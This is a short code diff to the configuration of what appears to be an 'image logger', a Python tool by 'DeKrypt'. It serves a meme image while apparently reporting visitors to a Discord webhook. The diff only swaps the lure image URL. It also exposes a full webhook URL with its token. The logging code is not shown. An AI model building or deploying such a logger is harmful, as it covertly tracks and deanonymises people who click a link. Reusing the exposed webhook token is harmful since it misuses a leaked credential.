@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1482310673991204874/09pMFVIvD4_-khbfF6Njs1K1CaJz788SHflYVR1wj4uMx659bTOemLGZANi0qQ6jMx8o",
-    "image": "https://e7.pngegg.com/pngimages/175/463/png-clipart-internet-meme-know-your-meme-information-meme-microphone-head-thumbnail.png", # You can also have a custom image by using a URL argument
+    "image": "https://i.imgflip.com/7f9vxf.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
